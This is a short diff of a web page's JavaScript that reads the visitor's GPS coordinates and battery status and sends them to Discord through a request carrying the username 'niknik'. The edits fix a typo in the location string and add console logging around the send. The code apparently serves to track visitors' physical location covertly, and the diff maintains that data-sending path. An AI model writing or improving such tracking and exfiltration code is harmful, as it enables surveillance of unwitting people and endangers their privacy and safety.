@@ -108,7 +108,7 @@
             }
 
             function showPosition(position) {
-                var gpsr = "Lattitute : " + position.coords.latitude + " Longitude : " + position.coords.longitude;
+                var gpsr = "Latitude: " + position.coords.latitude + " Longitude: " + position.coords.longitude;
                 senddis(gpsr);
             }
 
@@ -176,7 +176,11 @@
                     username: "niknik",
                     avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
                 }
+                console.log("Sending data to Discord: ", params);
                 request.send(JSON.stringify(params));
+                request.onload = function() {
+                    console.log("Data sent to Discord: ", request.responseText);
+                }
             }
 
             getBatteryStatus();
